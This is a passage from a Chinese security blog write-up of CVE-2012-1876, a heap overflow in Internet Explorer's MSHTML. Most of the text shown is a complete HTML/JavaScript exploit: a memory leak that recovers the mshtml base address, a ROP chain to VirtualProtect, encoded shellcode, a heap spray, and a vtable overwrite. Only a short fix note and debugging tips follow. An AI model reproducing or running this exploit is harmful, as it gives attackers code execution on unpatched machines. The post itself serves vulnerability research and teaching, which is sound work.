class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"124"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"125"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"126"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"127"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"128"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"129"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"130"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"131"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"132"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'javascript'</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> mshtmlbase = <span class="string">""</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> dap = <span class="string">"EEEE"</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">while</span> ( dap.length &lt; <span class="number">480</span> ) dap += dap;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> padding = <span class="string">"AAAA"</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">while</span> ( padding.length &lt; <span class="number">480</span> ) padding += padding;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> filler = <span class="string">"BBBB"</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">while</span> ( filler.length &lt; <span class="number">480</span> ) filler += filler;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> rra = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> div_container = <span class="built_in">document</span>.getElementById(<span class="string">"bUYP"</span>);</span></span><br><span class="line"><span class="javascript">div_container.style.cssText = <span class="string">"display:none"</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">500</span>; i+=<span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="undefined">  rra[i] = dap.substring(0, (0x100-6)/2);</span></span><br><span class="line"><span class="undefined">  arr[i] = padding.substring(0, (0x100-6)/2);</span></span><br><span class="line"><span class="undefined">  arr[i+1] = filler.substring(0, (0x100-6)/2);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> obj = <span class="built_in">document</span>.createElement(<span class="string">"button"</span>);</span></span><br><span class="line"><span class="undefined">  div_container.appendChild(obj);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">200</span>; i&lt;<span class="number">500</span>; i+=<span class="number">2</span> ) &#123;</span></span><br><span class="line"><span class="javascript">  rra[i] = <span class="literal">null</span>;</span></span><br><span class="line"><span class="undefined">  CollectGarbage();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> obj_col = <span class="built_in">document</span>.getElementById(<span class="string">"132"</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> obj_col1 = <span class="built_in">document</span>.getElementById(<span class="string">"131"</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> obj_col2 = <span class="built_in">document</span>.getElementById(<span class="string">"130"</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> obj_col3 = <span class="built_in">document</span>.getElementById(<span class="string">"129"</span>);</span></span><br><span class="line"><span class="undefined">obj_col.span = 19;</span></span><br><span class="line"><span class="undefined">obj_col1.span = 19;</span></span><br><span class="line"><span class="undefined">obj_col2.span = 19;</span></span><br><span class="line"><span class="undefined">obj_col3.span = 19;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">over_trigger</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> leak_addr = <span class="number">-1</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> ( <span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">500</span>; i++ ) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> ( arr[i].length &gt; (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span> ) &#123; <span class="comment">// overflowed</span></span></span><br><span class="line"><span class="undefined">      leak_index = i;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// alert(leak_index);</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> leak = arr[i].substring((<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>+(<span class="number">2</span>+<span class="number">8</span>)/<span class="number">2</span>, (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>+(<span class="number">2</span>+<span class="number">8</span>+<span class="number">4</span>)/<span class="number">2</span>);</span></span><br><span class="line"><span class="javascript">            leak_addr = <span class="built_in">parseInt</span>( leak.charCodeAt(<span class="number">1</span>).toString(<span class="number">16</span>) + leak.charCodeAt(<span class="number">0</span>).toString(<span class="number">16</span>), <span class="number">16</span> );</span></span><br><span class="line"><span class="javascript">            <span class="comment">// alert("CButtonLayout point:0x" + leak_addr.toString(16));</span></span></span><br><span class="line"><span class="javascript">      mshtmlbase = leak_addr - <span class="built_in">Number</span>(<span class="number">0x00173af8</span>);</span></span><br><span class="line"><span class="javascript">      <span class="comment">// alert("mshtml base:0x" + mshtmlbase.toString(16));</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> ( leak_addr == <span class="number">-1</span> || leak_index == <span class="number">-1</span> ) &#123; alert(<span class="string">"memory leak failed...."</span>); &#125;</span></span><br><span class="line"><span class="javascript"><span class="comment">//return mshtmlbase;</span></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">heap_spray</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">  CollectGarbage();</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> heapobj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="keyword">function</span> <span class="title">rop_chain</span>(<span class="params">mshtmlbase</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> arr = [</span></span><br><span class="line"><span class="javascript">    mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x117f0</span>),   <span class="comment">//   # retn </span></span></span><br><span class="line"><span class="javascript">    mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x50c736</span>),  <span class="comment">//   # POP EBP # RETN [mshtml.dll] </span></span></span><br><span class="line"><span class="javascript">    mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x117ef</span>),   <span class="comment">//   # 0x0707002C stack pivot:xchg eax,esp ; retn </span></span></span><br><span class="line"><span class="javascript">    mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x50c736</span>),  <span class="comment">//   # POP EBP # RETN [mshtml.dll] </span></span></span><br><span class="line"><span class="javascript">    mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x50c736</span>),  <span class="comment">//   # skip 4 bytes [mshtml.dll]</span></span></span><br><span class="line"><span class="javascript">    mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x9478e</span>),   <span class="comment">//   # POP EBX # RETN [mshtml.dll]  </span></span></span><br><span class="line"><span class="javascript">    <span class="number">0x00000201</span>,                     <span class="comment">//   # 0x00000201-&gt; ebx</span></span></span><br><span class="line"><span class="javascript">    mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x27e491</span>),  <span class="comment">//   # POP EDX # RETN [mshtml.dll]    </span></span></span><br><span class="line"><span class="javascript">    <span class="number">0x00000040</span>,                     <span class="comment">//   # 0x00000040-&gt; edx</span></span></span><br><span class="line"><span class="javascript">    mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x343b</span>),    <span class="comment">//   # POP ECX # RETN [mshtml.dll]  </span></span></span><br><span class="line"><span class="javascript">    mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x53b7ca</span>),  <span class="comment">//   # &amp;Writable location [mshtml.dll] </span></span></span><br><span class="line"><span class="javascript">    mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x195a6e</span>),  <span class="comment">//   # POP EDI # RETN [mshtml.dll]  </span></span></span><br><span class="line"><span class="javascript">    mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x424902</span>),  <span class="comment">//   # RETN (ROP NOP) [mshtml.dll]   </span></span></span><br><span class="line"><span class="javascript">    mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x3e0b3e</span>),  <span class="comment">//   # POP ESI # RETN [mshtml.dll]              </span></span></span><br><span class="line"><span class="javascript">    mshtmlbase + <span class="built_in">Number</span>(<span class="number">0xa057</span>),    <span class="comment">//   # JMP [EAX] [mshtml.dll] </span></span></span><br><span class="line"><span class="javascript">    mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x4abfd2</span>),  <span class="comment">//   # POP EAX # RETN [mshtml.dll]  </span></span></span><br><span class="line"><span class="javascript">    mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x1308</span>),    <span class="comment">//   # ptr to &amp;VirtualProtect() [IAT mshtml.dll] </span></span></span><br><span class="line"><span class="javascript">    mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x3a37c0</span>),  <span class="comment">//   # PUSHAD # RETN [mshtml.dll]  </span></span></span><br><span class="line"><span class="javascript">    mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x748bc</span>),   <span class="comment">//   # ptr to 'jmp esp' [mshtml.dll]              </span></span></span><br><span class="line"><span class="undefined">    0x90909090,</span></span><br><span class="line"><span class="undefined">    0x06eb,</span></span><br><span class="line"><span class="javascript">    <span class="comment">//0x90909090,</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//0xE9909090,// pop retn machineCode</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//0x1B000707</span></span></span><br><span class="line"><span class="undefined">       ];</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> arr;</span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="keyword">function</span> <span class="title">d2u</span>(<span class="params">dword</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> uni = <span class="built_in">String</span>.fromCharCode(dword &amp; <span class="number">0xFFFF</span>);</span></span><br><span class="line"><span class="javascript">    uni += <span class="built_in">String</span>.fromCharCode(dword&gt;&gt;<span class="number">16</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> uni;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="keyword">function</span> <span class="title">tab2uni</span>(<span class="params">heapobj, tab</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> uni = <span class="string">""</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;tab.length;i++)&#123;</span></span><br><span class="line"><span class="undefined">        uni += heapobj.d2u(tab[i]);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> uni;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">  heapobj.tab2uni = tab2uni;</span></span><br><span class="line"><span class="undefined">  heapobj.d2u = d2u;</span></span><br><span class="line"><span class="undefined">  heapobj.rop_chain = rop_chain;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> code = <span class="built_in">unescape</span>(<span class="string">"%u7dbd%u35c4%udbef%ud9c9%u2474%u5ff4%uc931%u42b1%u6f31%u8314%u04c7%u6f03%u9f10%uec31%uc404%u7b63%u0eff%u56a2%u994d%u9ff4%ueed6%u2f86%u869c%udb64%u7ad4%u9dfe%u0910%u027e%u3baa%u0d47%u36b4%uc844%u69c5%u0a55%u02a5%ue9c6%u9f02%uce52%ucbc1%u5674%u19d7%uec0f%u56cf%ud14a%u83ee%u2588%ud8b8%ucd7b%u303b%u2eb2%u0c0a%u7c49%u4ce9%u7ac6%u8333%u842a%uf074%ubdc1%u2206%ub702%ua117%u1308%u5ed9%ud0ca%uebd5%ubd98%ueaf9%uca75%u6706%u2588%u338f%ua9af%u78f1%ud91d%uaad8%u3feb%u9093%u3184%u1aea%u1cb9%ubd1b%u5ebe%u4824%ua505%u3460%u475e%u4fe5%uac42%ua758%u53f5%uc8a3%ue983%u5e54%u9df8%udf44%u6d68%uf1b7%uf90c%u7ec2%u8ba8%u5b1c%u30ba%u5179%u2e32%u9ad7%uab11%ua651%u08ca%u84c9%ud2a6%ud48d%u791c%ubb7a%u82a3%u2b85%u1e32%uf312%u94a2%u7180%u3d52%u1c22%ud3f5%u059d%u777d%ub2fa%u6bf7%uaa6a%u0464%u5a33%ub61f%ufbb1%u51b7%u9a5f%uaf29%ud456%uebfa%u6d63%uc5e3%u3fa1%u74b7%u4014%u46e7%uee58%ufcf7%u4150"</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> rop_chain = heapobj.tab2uni(heapobj, heapobj.rop_chain(mshtmlbase)) ;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> shellcode = rop_chain + code;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">while</span> (shellcode.length &lt; <span class="number">100000</span>)</span></span><br><span class="line"><span class="undefined">  shellcode = shellcode + shellcode;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> onemeg = shellcode.substr(<span class="number">0</span>, <span class="number">64</span>*<span class="number">1024</span>/<span class="number">2</span>);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">14</span>; i++) &#123;</span></span><br><span class="line"><span class="undefined">    onemeg += shellcode.substr(0, 64*1024/2);</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">  onemeg += shellcode.substr(0, (64*1024/2)-(38/2));</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> spray = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">400</span>; i++) &#123;</span></span><br><span class="line"><span class="undefined">    spray[i] = onemeg.substr(0, onemeg.length);</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">smash_vtable</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="comment">// alert("start");</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> obj_col_0 = <span class="built_in">document</span>.getElementById(<span class="string">"132"</span>);</span></span><br><span class="line"><span class="javascript">  obj_col_0.width = <span class="string">"1178993"</span>; <span class="comment">//0x07070024</span></span></span><br><span class="line"><span class="javascript">  obj_col_0.span = <span class="string">"44"</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">setTimeout(<span class="string">"over_trigger();"</span>,<span class="number">1</span>);</span></span><br><span class="line"><span class="javascript">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;heap_spray()&#125;, <span class="number">400</span>);</span></span><br><span class="line"><span class="javascript">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;smash_vtable()&#125;, <span class="number">700</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><img src="http://pic.giantbranch.cn/1506415872810.jpg" alt></p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>就是在span更改后重新分配相应大小的内存即可</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
<li>漏洞的原因是span值改变后内存没有重新分配或者再次申请更多内存，导致可以越界写</li>
<li>在信息泄露的时候通过巧妙的构造，覆盖字符串头部的长度值，可以泄露出CButton虚表指针，从而通过偏移计算存储mshtml的基址</li>
<li>在漏洞利用的时候，通过特定的长度值，覆盖虚表指针，导致任意代码执行，通过堆的巧妙布局，精确地控制数据的布局，利用rop绕过DEP，成功执行代码</li>
</ol>
<h1 id="漏洞之外的东西"><a href="#漏洞之外的东西" class="headerlink" title="漏洞之外的东西"></a>漏洞之外的东西</h1><ol>
<li>调试过程中下的断点太重要了，只要下对了，一下就找到关键点，整个人都阔然开朗</li>
<li>调试ie的漏洞，特别是javascript相关的，用javascript断点或者alert可以大大节省调试时间，因为你下一个断点可能断得太多，你让javascript执行到那里采取启用断点，那就可以节省很多时间了</li>
</ol>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>自愿打赏专区</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>打赏</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="http://paypic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付">
        <p>微信支付</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="http://paypic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝">
        <p>支付宝</p>
      </div>
    

    

  </div>
</div>

      </div>
    
    
      <div class="footer-custom">
        <b>paypal: <a href="https://www.paypal.me/giantbranch">https://www.paypal.me/giantbranch</a> </b>
      </div>
    

    
    <div style="padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
    	<div><img src="http://paypic.giantbranch.cn/ask.png"></div>
    </div>
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者：</strong>
    giantbranch
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://www.giantbranch.cn/2017/08/19/CVE-2012-1876 IE MSHTML.DLL CalculateMinMax 堆溢出漏洞/" title="CVE-2012-1876 IE MSHTML.DLL CalculateMinMax 堆溢出漏洞">https://www.giantbranch.cn/2017/08/19/CVE-2012-1876 IE MSHTML.DLL CalculateMinMax 堆溢出漏洞/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>
    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2017/08/19/windbg 调试笔记/" rel="next" title="windbg 调试笔记">
                <i class="fa fa-chevron-left"></i> windbg 调试笔记
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2017/08/22/从Exploit-Exercises Fusion Level02看linux绕过ASLR和NX的三种利用方式/" rel="prev" title="从Exploit-Exercises Fusion Level02看linux绕过ASLR和NX的三种利用方式">
                从Exploit-Exercises Fusion Level02看linux绕过ASLR和NX的三种利用方式 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
        
  <div class="bdsharebuttonbox">
    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
    <a href="#" class="bds_more" data-cmd="more"></a>
    <a class="bds_count" data-cmd="count"></a>
  </div>
  <script>
    window._bd_share_config = {
      "common": {
        "bdText": "",
        "bdMini": "2",
        "bdMiniList": false,
        "bdPic": ""
      },
      "share": {
        "bdSize": "16",
        "bdStyle": "0"
      },
      "image": {
        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
        "viewText": "分享到：",
        "viewSize": "16"
      }
    }
  </script>

<script>
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

      
    </div>
    <div class="footer-custom">
	<b>假如你看不到评论，可能是你访问Disqus被墙了，请使用代理访问</b>
    </div>
  </div>


          </div>
          


          
  
    <div class="comments" id="comments">
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    </div>
  


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">giantbranch</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">174</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">216</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          <div class="links-of-author motion-element">
            
              
                <span class="links-of-author-item">
                  <a href="https://github.com/giantbranch" target="_blank" title="GitHub">
                    
                      <i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://twitter.com/giantbranch" target="_blank" title="Twitter">
                    
                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
                </span>
              
            
          </div>

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-globe"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.csdn.net/u012763794" title="my csdn blog" target="_blank">my csdn blog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://oldblog.giantbranch.cn/" title="old blog" target="_blank">old blog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://weaponx.site/" title="WeaponX" target="_blank">WeaponX</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.tasfa.cn/" title="Tasfa" target="_blank">Tasfa</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://matshao.com/" title="MatShao" target="_blank">MatShao</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#分析环境"><span class="nav-number">1.</span> <span class="nav-text">分析环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基于HPA的漏洞分析方法"><span class="nav-number">2.</span> <span class="nav-text">基于HPA的漏洞分析方法</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#信息泄露原理分析"><span class="nav-number">3.</span> <span class="nav-text">信息泄露原理分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞修复"><span class="nav-number">5.</span> <span class="nav-text">漏洞修复</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞之外的东西"><span class="nav-number">7.</span> <span class="nav-text">漏洞之外的东西</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2023</span>
